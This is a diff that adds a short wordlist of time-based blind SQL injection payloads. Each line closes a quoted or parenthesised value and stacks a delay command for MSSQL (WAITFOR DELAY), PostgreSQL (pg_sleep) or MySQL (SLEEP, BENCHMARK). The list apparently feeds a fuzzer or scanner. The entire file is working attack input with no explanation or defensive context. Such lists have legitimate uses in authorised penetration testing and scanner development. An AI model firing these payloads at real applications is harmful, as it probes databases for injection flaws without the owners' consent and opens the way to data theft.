@@ -1,0 +1,13 @@
+'; WAITFOR DELAY '0:0:5'-- -
+'); WAITFOR DELAY '0:0:5'-- -
+1); WAITFOR DELAY '0:0:5'-- -
+'; SELECT pg_sleep(5)-- -
+'); SELECT pg_sleep(5)-- -
+1); SELECT pg_sleep(5)-- -
+"; SELECT pg_sleep(5)-- -
+")); SELECT pg_sleep(5)-- -
+1); SELECT SLEEP(5)-- -
+"; SELECT SLEEP(5)-- -
+1); SELECT BENCHMARK(5000000,MD5(1))-- -
+
+
